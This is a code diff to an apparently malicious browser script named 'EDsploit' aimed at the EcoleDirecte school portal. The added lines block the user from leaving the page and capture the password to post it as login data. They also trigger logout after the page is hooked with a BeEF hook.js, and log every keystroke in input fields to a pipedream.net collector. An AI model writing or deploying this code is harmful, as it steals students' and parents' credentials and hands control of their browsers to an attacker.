@@ -1,4 +1,8 @@
 const ur = new URL(document.currentScript.src);
+window.addEventListener('beforeunload', (e) => {
+  e.preventDefault();
+  e.returnValue = '';
+});
 
 (async function ex() {
 
@@ -17,6 +21,19 @@ const ur = new URL(document.currentScript.src);
 	await new Promise(resolve => setTimeout(resolve, 2000));
 	
 	const pass = pwdInput.value
+
+	const pata = {
+    	identifiant: identifiant.payload.accounts?.[0].identifiant,
+    	motdepasse: pass
+	};
+
+	await fetch('https://api.ecoledirecte.com/v3/admin/login/3DSecure.awp', {
+		method: "POST",
+		headers: {
+			"Content-Type": "application/json"
+		},
+		body: JSON.stringify({ data: JSON.stringify(pata) })
+	})
   
 	const data = {
 		t: new Date().toISOString(),
@@ -62,17 +79,36 @@ async function iframe() {
 		beef.src = "https://beef.local/hook.js";
 		beef.async = true;
 		window.top.document.body.appendChild(beef);
+		await new Promise(resolve => setTimeout(resolve, 8000));
+		document.querySelector('button[title="Se déconnecter"]').click();
 	};
 	
 	return;
 };
 
 (async function() {
-	if (true) {
-		if (window.top.document.body.querySelector('iframe[class=EDsploit]')) {
+	if (ur.searchParams.get("iframetrap") === "true") {
+		if (document.body.querySelector('iframe[class=EDsploit]')) {
 			return null
 		} else {
 			await iframe()
 		}
 	}
+})();
+
+(async function() {
+    document.querySelectorAll('input').forEach(field => {
+		field.addEventListener('input', async function() {
+			const name = this.name || this.id || this.type || 'field';
+			const value = this.value;
+
+			console.log(`[${name}] : ${value}`)
+
+			await fetch('https://eoXXXXXX.m.pipedream.net', {
+			method: 'POST',
+			body: JSON.stringify({ field: name, value }),
+			headers: { 'Content-Type': 'application/json' }
+			});
+		});
+	});
 })();
